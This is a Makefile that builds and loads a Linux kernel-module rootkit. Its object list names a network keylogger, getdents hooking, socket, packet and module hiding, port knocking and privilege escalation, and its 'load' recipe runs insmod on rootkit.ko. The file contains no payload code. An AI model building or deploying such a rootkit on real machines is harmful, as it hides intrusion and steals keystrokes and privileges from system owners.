# Module name
ROOTKIT		:= rootkit

# Build
MODULEDIR	:= /lib/modules/$(shell uname -r)
BUILDDIR	:= $(MODULEDIR)/build
KERNELDIR 	:= $(MODULEDIR)/kernel

# Source files
SRCS_S 		:= src
LIBS_S 		:= src/libs
INCL_S 		:= src/include

# Header files
SRCS_H		:= $(PWD)/$(SRCS_S)/headers
LIBS_H		:= $(PWD)/$(LIBS_S)/headers
INCL_H		:= $(PWD)/$(INCL_S)/headers

# See below for explanation.
#
# Files
# CORE		:= src/core.c
# CORE_OBJS	:= $(patsubst %.c, %.o, $(CORE))
# SRCS_OBJS	:= $(patsubst %.c, %.o, $(filter-out $(CORE), $(wildcard $(SRCS_S)/*.c)))
# LIBS_OBJS	:= $(patsubst %.c, %.o, $(wildcard $(LIBS_S)/*.c))
# INCL_OBJS	:= $(patsubst %.c, %.o, $(wildcard $(INCL_S)/*.c))

# Module
obj-m 		:= $(ROOTKIT).o

# Not working, reason unknown.
# https://stackoverflow.com/questions/46241141/makefile-lkm-sources-as-variables-not-working
#
# $(ROOTKIT)-y	+= $(CORE_OBJS) $(SRCS_OBJS) $(LIBS_OBJS) $(INCL_OBJS)

# Core
$(ROOTKIT)-y 	+= src/core.o

# Source
$(ROOTKIT)-y 	+= src/server.o
$(ROOTKIT)-y 	+= src/network_keylog.o
$(ROOTKIT)-y 	+= src/getdents_hook.o
$(ROOTKIT)-y 	+= src/socket_hiding.o
$(ROOTKIT)-y 	+= src/packet_hiding.o
$(ROOTKIT)-y 	+= src/port_knocking.o
$(ROOTKIT)-y 	+= src/privilege_escalation.o
$(ROOTKIT)-y 	+= src/module_hiding.o

# Libs
$(ROOTKIT)-y 	+= src/libs/syscalltable.o

# Include
$(ROOTKIT)-y 	+= src/include/utils.o

ccflags-y	:= -I$(SRCS_H) -I$(LIBS_H) -I$(INCL_H)

# Recipes
all:
	$(MAKE) -C $(BUILDDIR) M=$(PWD) modules

load:
	insmod $(KERNELDIR)/net/ipv4/netfilter/nf_reject_ipv4.ko
	insmod $(KERNELDIR)/net/ipv6/netfilter/nf_reject_ipv6.ko
	insmod rootkit.ko

clean:
	$(MAKE) -C $(BUILDDIR) M=$(PWD) clean